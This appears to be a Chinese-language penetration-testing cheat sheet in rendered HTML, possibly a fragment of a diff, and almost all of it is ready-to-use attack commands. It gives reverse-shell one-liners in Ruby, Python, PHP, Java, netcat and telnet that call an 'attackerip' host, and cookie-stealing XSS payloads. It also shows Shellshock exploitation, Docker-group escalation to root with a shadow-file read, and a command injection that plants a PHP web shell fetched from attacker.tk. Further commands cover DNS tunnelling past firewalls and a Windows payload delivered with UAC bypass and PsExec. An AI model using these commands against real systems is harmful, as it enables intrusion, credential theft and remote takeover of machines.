+<h3 id="RUBY-反弹-Shell"><a href="#RUBY-反弹-Shell" class="headerlink" title="RUBY 反弹 Shell"></a>RUBY 反弹 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'exit if fork;c=TCPSocket.new("attackerip","443");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Win 平台</span></span><br><span class="line">ruby -rsocket -e <span class="string">'c=TCPSocket.new("attackerip","443");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br><span class="line">ruby -rsocket -e <span class="string">'f=TCPSocket.open("attackerip","443").to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure>
+<h3 id="PYTHON-反弹-Shell"><a href="#PYTHON-反弹-Shell" class="headerlink" title="PYTHON 反弹 Shell"></a>PYTHON 反弹 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attackerip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure>
+<h3 id="PHP-反弹-Shell"><a href="#PHP-反弹-Shell" class="headerlink" title="PHP 反弹 Shell"></a>PHP 反弹 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("attackerip",443);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
+<h3 id="JAVA-反弹-Shell"><a href="#JAVA-反弹-Shell" class="headerlink" title="JAVA 反弹 Shell"></a>JAVA 反弹 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/attackerip/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
+<h3 id="NETCAT-反弹-Shell"><a href="#NETCAT-反弹-Shell" class="headerlink" title="NETCAT 反弹 Shell"></a>NETCAT 反弹 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh attackerip 4444</span><br><span class="line">nc -e /bin/sh 192.168.37.10 443</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果 -e 参数被禁用，可以尝试以下命令</span></span><br><span class="line"><span class="comment"># mknod backpipe p &amp;&amp; nc attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe</span></span><br><span class="line">/bin/sh | nc attackerip 443</span><br><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4443 0/tmp/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果你安装错了 netcat 的版本，请尝试以下命令</span></span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+<h3 id="TELNET-反弹-Shell"><a href="#TELNET-反弹-Shell" class="headerlink" title="TELNET 反弹 Shell"></a>TELNET 反弹 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果 netcat 不可用或者 /dev/tcp</span></span><br><span class="line">mknod backpipe p &amp;&amp; telnet attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>
+<h3 id="XTERM-反弹-Shell"><a href="#XTERM-反弹-Shell" class="headerlink" title="XTERM 反弹 Shell"></a>XTERM 反弹 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://baike.baidu.com/view/418628.htm</span></span><br><span class="line"><span class="comment"># 开启 X 服务器 (:1 – 监听 TCP 端口 6001)</span></span><br><span class="line">apt-get install xnest</span><br><span class="line">Xnest :1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 记得授权来自目标 IP 的连接</span></span><br><span class="line">xterm -display 127.0.0.1:1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 授权访问</span></span><br><span class="line">xhost +targetip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在目标机器上连接回我们的 X 服务器</span></span><br><span class="line">xterm -display attackerip:1</span><br><span class="line">/usr/openwin/bin/xterm -display attackerip:1</span><br><span class="line">or</span><br><span class="line">$ DISPLAY=attackerip:0 xterm</span><br></pre></td></tr></table></figure>
+<h3 id="XSS备忘录"><a href="#XSS备忘录" class="headerlink" title="XSS备忘录"></a>XSS备忘录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</span><br><span class="line">(<span class="string">"&lt; iframes &gt; src=http://IP:PORT &lt;/ iframes &gt;"</span>)</span><br><span class="line"></span><br><span class="line">&lt;script&gt;document.location=http://IP:PORT&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="string">';alert(String.fromCharCode(88,83,83))//\'</span>;alert(String.fromCharCode(88,83,83))//<span class="string">";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//–&gt;&lt;/SCRIPT&gt;"</span>&gt;<span class="string">'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">";!–"&lt;XSS&gt;=&amp;amp;amp;&#123;()&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;IMG SRC="javascript:alert('</span>XSS<span class="string">');"&gt;</span></span><br><span class="line"><span class="string">&lt;IMG SRC=javascript:alert('</span>XSS<span class="string">')&gt;</span></span><br><span class="line"><span class="string">&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;""&gt;</span></span><br><span class="line"><span class="string">&lt;IMG SRC=&amp;amp;amp;#106;&amp;amp;amp;#97;&amp;amp;amp;#118;&amp;amp;amp;#97;&amp;amp;amp;#115;&amp;amp;amp;#99;&amp;amp;amp;#114;&amp;amp;amp;#105;&amp;amp;amp;#112;&amp;amp;amp;#116;&amp;amp;amp;#58;&amp;amp;amp;#97;&amp;amp;amp;#108;&amp;amp;amp;#101;&amp;amp;amp;#114;&amp;amp;amp;#116;&amp;amp;amp;#40;&amp;amp;amp;#39;&amp;amp;amp;#88;&amp;amp;amp;#83;&amp;amp;amp;#83;&amp;amp;amp;#39;&amp;amp;amp;#41;&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;IMG SRC=&amp;amp;amp;#0000106&amp;amp;amp;#0000097&amp;amp;amp;#0000118&amp;amp;amp;#0000097&amp;amp;amp;#0000115&amp;amp;amp;#0000099&amp;amp;amp;#0000114&amp;amp;amp;#0000105&amp;amp;amp;#0000112&amp;amp;amp;#0000116&amp;amp;amp;#0000058&amp;amp;amp;#0000097&amp;amp;amp;#0000108&amp;amp;amp;#0000101&amp;amp;amp;#0000114&amp;amp;amp;#0000116&amp;amp;amp;#0000040&amp;amp;amp;#0000039&amp;amp;amp;#0000088&amp;amp;amp;#0000083&amp;amp;amp;#0000083&amp;amp;amp;#0000039&amp;amp;amp;#0000041&gt;</span></span><br><span class="line"><span class="string">&lt;IMG SRC="jav ascript:alert('</span>XSS<span class="string">');"&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">perl -e '</span><span class="built_in">print</span> <span class="string">"&lt;IMG SRC=javascript:alert(\"XSS\")&gt;"</span>;<span class="string">' &gt; out</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">("&gt;&lt; iframes http://google.com &lt; iframes &gt;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;BODY BACKGROUND="javascript:alert('</span>XSS<span class="string">')"&gt;</span></span><br><span class="line"><span class="string">&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert('</span>XSS<span class="string">');"&gt;&lt;/FRAMESET&gt;</span></span><br><span class="line"><span class="string">"&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;</span></span><br><span class="line"><span class="string">%253cscript%253ealert(document.cookie)%253c/script%253e</span></span><br><span class="line"><span class="string">"&gt;&lt;s"%2b"cript&gt;alert(document.cookie)&lt;/script&gt;</span></span><br><span class="line"><span class="string">%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)'</span>%3E</span><br><span class="line">&lt;img src=asdf onerror=alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="SSH-Over-SCTP-使用-Socat"><a href="#SSH-Over-SCTP-使用-Socat" class="headerlink" title="SSH Over SCTP (使用 Socat)"></a>SSH Over SCTP (使用 Socat)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 远端服务器</span></span><br><span class="line"><span class="comment"># 假设你准备让 SCTP socket 监听端口 80/SCTP 并且 sshd 端口在 22/TCP</span></span><br><span class="line">$ socat SCTP-LISTEN:80,fork TCP:localhost:22</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地端</span></span><br><span class="line"><span class="comment"># 将 SERVER_IP 换成远端服务器的地址，然后将 80 换成 SCTP 监听的端口号</span></span><br><span class="line">$ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 socks 代理</span></span><br><span class="line"><span class="comment"># 替换 username 和 -p 的端口号</span></span><br><span class="line">$ ssh -lusername localhost -D 8080 -p 1337</span><br></pre></td></tr></table></figure>
+<p>使用洋葱网络<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装服务</span></span><br><span class="line">$ apt-get install tor torsocks</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定 ssh 到 tor 服务端口 80</span></span><br><span class="line"><span class="comment"># /etc/tor/torrc</span></span><br><span class="line">SocksPolicy accept 127.0.0.1</span><br><span class="line">SocksPolicy accept 192.168.0.0/16</span><br><span class="line">Log notice file /var/<span class="built_in">log</span>/tor/notices.log</span><br><span class="line">RunAsDaemon 1</span><br><span class="line">HiddenServiceDir /var/lib/tor/ssh_hidden_service/</span><br><span class="line">HiddenServicePort 80 127.0.0.1:22</span><br><span class="line">PublishServerDescriptor 0</span><br><span class="line">$ /etc/init.d/tor start</span><br><span class="line">$ cat /var/lib/tor/ssh_hidden_service/hostname</span><br><span class="line">3l5zstvt1zk5jhl662.onion</span><br><span class="line"></span><br><span class="line"><span class="comment"># ssh 客户端连接</span></span><br><span class="line">$ apt-get install torsocks</span><br><span class="line">$ torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80</span><br></pre></td></tr></table></figure></p>
+<h3 id="Metagoofil-–-元数据收集工具"><a href="#Metagoofil-–-元数据收集工具" class="headerlink" title="Metagoofil – 元数据收集工具"></a>Metagoofil – 元数据收集工具</h3><p>注：Metagoofil 是一款利用Google收集信息的工具。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://www.edge-security.com/metagoofil.php</span></span><br><span class="line"><span class="comment"># 它可以自动在搜素引擎中检索和分析文件，还具有提供Mac地址，用户名列表等其他功能</span></span><br><span class="line">$ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html</span><br></pre></td></tr></table></figure></p>
+<h3 id="利用-Shellshock"><a href="#利用-Shellshock" class="headerlink" title="利用 Shellshock"></a>利用 Shellshock</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一个发现并利用服务器 Shellshock 的工具</span></span><br><span class="line"><span class="comment"># https://github.com/nccgroup/shocker</span></span><br><span class="line">$ ./shocker.py -H 192.168.56.118  --<span class="built_in">command</span> <span class="string">"/bin/cat /etc/passwd"</span> -c /cgi-bin/status --verbose</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件</span></span><br><span class="line">$ <span class="built_in">echo</span> -e <span class="string">"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; echo \$(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n"</span> | nc 192.168.56.118 80</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定 shell</span></span><br><span class="line">$ <span class="built_in">echo</span> -e <span class="string">"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n"</span> | nc 192.168.56.118 80</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反弹 Shell</span></span><br><span class="line">$ nc -l -p 443</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n"</span> | nc 192.168.56.118 80</span><br></pre></td></tr></table></figure>
+<h3 id="获取-Docker-的-Root"><a href="#获取-Docker-的-Root" class="headerlink" title="获取 Docker 的 Root"></a>获取 Docker 的 Root</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取  Docker 的 Root</span></span><br><span class="line"><span class="comment"># user 必须在 docker 用户组中</span></span><br><span class="line">ek@victum:~/docker-test$ id</span><br><span class="line">uid=1001(ek) gid=1001(ek) groups=1001(ek),114(docker)</span><br><span class="line"></span><br><span class="line">ek@victum:~$ mkdir docker-test</span><br><span class="line">ek@victum:~$ <span class="built_in">cd</span> docker-test</span><br><span class="line"></span><br><span class="line">ek@victum:~$ cat &gt; Dockerfile</span><br><span class="line">FROM debian:wheezy</span><br><span class="line"></span><br><span class="line">ENV WORKDIR /stuff</span><br><span class="line"></span><br><span class="line">RUN mkdir -p <span class="variable">$WORKDIR</span></span><br><span class="line"></span><br><span class="line">VOLUME [ <span class="variable">$WORKDIR</span> ]</span><br><span class="line"></span><br><span class="line">WORKDIR <span class="variable">$WORKDIR</span></span><br><span class="line">&lt;&lt; EOF</span><br><span class="line"></span><br><span class="line">ek@victum:~$ docker build -t my-docker-image .</span><br><span class="line">ek@victum:~$ docker run -v <span class="variable">$PWD</span>:/stuff -t my-docker-image /bin/sh -c \</span><br><span class="line"><span class="string">'cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/sh'</span></span><br><span class="line">./sh</span><br><span class="line">whoami</span><br><span class="line"><span class="comment"># root</span></span><br><span class="line"></span><br><span class="line">ek@victum:~$ docker run -v /etc:/stuff -t my-docker-image /bin/sh -c <span class="string">'cat /stuff/shadow'</span></span><br></pre></td></tr></table></figure>
+<h3 id="使用-DNS-隧道绕过防火墙"><a href="#使用-DNS-隧道绕过防火墙" class="headerlink" title="使用 DNS 隧道绕过防火墙"></a>使用 DNS 隧道绕过防火墙</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 让数据和命令使用 DNS 隧道传输以绕过防火墙的检查</span></span><br><span class="line"><span class="comment"># dnscat2 支持从目标主机上面上传和下载命令来获取文件、数据和程序</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务器 (攻击者)</span></span><br><span class="line">$ apt-get update</span><br><span class="line">$ apt-get -y install ruby-dev git make g++</span><br><span class="line">$ gem install bundler</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line">$ <span class="built_in">cd</span> dnscat2/server</span><br><span class="line">$ bundle install</span><br><span class="line">$ ruby ./dnscat2.rb</span><br><span class="line">dnscat2&gt; New session established: 16059</span><br><span class="line">dnscat2&gt; session -i 16059</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户机 (目标)</span></span><br><span class="line"><span class="comment"># https://downloads.skullsecurity.org/dnscat2/</span></span><br><span class="line"><span class="comment"># https://github.com/lukebaggett/dnscat2-powershell</span></span><br><span class="line">$ dnscat --host &lt;dnscat server_ip&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="编译-Assemble-代码"><a href="#编译-Assemble-代码" class="headerlink" title="编译 Assemble 代码"></a>编译 Assemble 代码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ nasm -f elf32 simple32.asm -o simple32.o</span><br><span class="line">$ ld -m elf_i386 simple32.o simple32</span><br><span class="line"></span><br><span class="line">$ nasm -f elf64 simple.asm -o simple.o</span><br><span class="line">$ ld simple.o -o simple</span><br></pre></td></tr></table></figure>
+<h3 id="使用非交互-Shell-打入内网"><a href="#使用非交互-Shell-打入内网" class="headerlink" title="使用非交互 Shell 打入内网"></a>使用非交互 Shell 打入内网</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成 shell 使用的 ssh 密钥</span></span><br><span class="line">$ wget -O - -q <span class="string">"http://domain.tk/sh.php?cmd=whoami"</span></span><br><span class="line">$ wget -O - -q <span class="string">"http://domain.tk/sh.php?cmd=ssh-keygen -f /tmp/id_rsa -N \"\" "</span></span><br><span class="line">$ wget -O - -q <span class="string">"http://domain.tk/sh.php?cmd=cat /tmp/id_rsa"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 增加用户 tempuser </span></span><br><span class="line">$ useradd -m tempuser</span><br><span class="line">$ mkdir /home/tempuser/.ssh &amp;&amp; chmod 700 /home/tempuser/.ssh</span><br><span class="line">$ wget -O - -q <span class="string">"http://domain.tk/sh.php?cmd=cat /tmp/id_rsa"</span> &gt; /home/tempuser/.ssh/authorized_keys</span><br><span class="line">$ chmod 700 /home/tempuser/.ssh/authorized_keys</span><br><span class="line">$ chown -R tempuser:tempuser /home/tempuser/.ssh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反弹 ssh shell</span></span><br><span class="line">$ wget -O - -q <span class="string">"http://domain.tk/sh.php?cmd=ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no -R 127.0.0.1:8080:192.168.20.13:8080 -N -f tempuser@&lt;attacker_ip&gt;"</span></span><br></pre></td></tr></table></figure>
+<h3 id="利用-POST-远程命令执行获取-Shell"><a href="#利用-POST-远程命令执行获取-Shell" class="headerlink" title="利用 POST 远程命令执行获取 Shell"></a>利用 POST 远程命令执行获取 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">attacker:~$ curl -i -s -k  -X <span class="string">'POST'</span> --data-binary $<span class="string">'IP=%3Bwhoami&amp;submit=submit'</span> <span class="string">'http://victum.tk/command.php'</span></span><br><span class="line"></span><br><span class="line">attacker:~$ curl -i -s -k  -X <span class="string">'POST'</span> --data-binary $<span class="string">'IP=%3Becho+%27%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%27+%3E+..%2Fshell.php&amp;submit=submit'</span> <span class="string">'http://victum.tk/command.php'</span></span><br><span class="line"></span><br><span class="line">attacker:~$ curl http://victum.tk/shell.php?cmd=id</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在服务器上下载 shell (phpshell.php)</span></span><br><span class="line"></span><br><span class="line">http://victum.tk/shell.php?cmd=php%20-r%20%27file_put_contents%28%22phpshell.php%22,%20fopen%28%22http://attacker.tk/phpshell.txt%22,%20%27r%27%29%29;%27</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行 nc 并执行 phpshell.php</span></span><br><span class="line">attacker:~$ nc -nvlp 1337</span><br></pre></td></tr></table></figure>
+<h3 id="以管理员身份在-Win7-上反弹具有系统权限的-Shell"><a href="#以管理员身份在-Win7-上反弹具有系统权限的-Shell" class="headerlink" title="以管理员身份在 Win7 上反弹具有系统权限的 Shell"></a>以管理员身份在 Win7 上反弹具有系统权限的 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">msfvenom –p windows/shell_reverse_tcp LHOST=192.168.56.102 –f exe &gt; danger.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示账户配置</span></span><br><span class="line">net user &lt;login&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Kali 上下载 psexec</span></span><br><span class="line"></span><br><span class="line">https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 powershell 脚本上传 psexec.exe 到目标机器</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$client</span> = New-Object System.Net.WebClient &gt; script.ps1</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$targetlocation</span> = <span class="string">"http://192.168.56.102/PsExec.exe"</span> &gt;&gt; script.ps1</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$client</span>.DownloadFile(<span class="variable">$targetlocation</span>,<span class="string">"psexec.exe"</span>) &gt;&gt; script.ps1</span><br><span class="line">powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 powershell 脚本上传 danger.exe 到目标机器</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$client</span> = New-Object System.Net.WebClient &gt; script2.ps1</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$targetlocation</span> = <span class="string">"http://192.168.56.102/danger.exe"</span> &gt;&gt; script2.ps1</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$client</span>.DownloadFile(<span class="variable">$targetlocation</span>,<span class="string">"danger.exe"</span>) &gt;&gt; script2.ps1</span><br><span class="line">powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用预编译的二进制文件绕过 UAC:</span></span><br><span class="line"></span><br><span class="line">https://github.com/hfiref0x/UACME</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 powershell 脚本上传 https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe 到目标机器</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$client</span> = New-Object System.Net.WebClient &gt; script2.ps1</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$targetlocation</span> = <span class="string">"http://192.168.56.102/Akagi64.exe"</span> &gt;&gt; script3.ps1</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$client</span>.DownloadFile(<span class="variable">$targetlocation</span>,<span class="string">"Akagi64.exe"</span>) &gt;&gt; script3.ps1</span><br><span class="line">powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 Kali 上创建监听</span></span><br><span class="line">nc -lvp 4444</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以系统权限使用 Akagi64 运行 danger.exe </span></span><br><span class="line">Akagi64.exe 1 C:\Users\User\Desktop\danger.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 Kali 上创建监听</span></span><br><span class="line">nc -lvp 4444</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下一步就会反弹给我们一个提过权的 shell</span></span><br><span class="line"><span class="comment"># 以系统权限使用 PsExec 运行 danger.exe </span></span><br><span class="line">psexec.exe –i –d –accepteula –s danger.exe</span><br></pre></td></tr></table></figure>
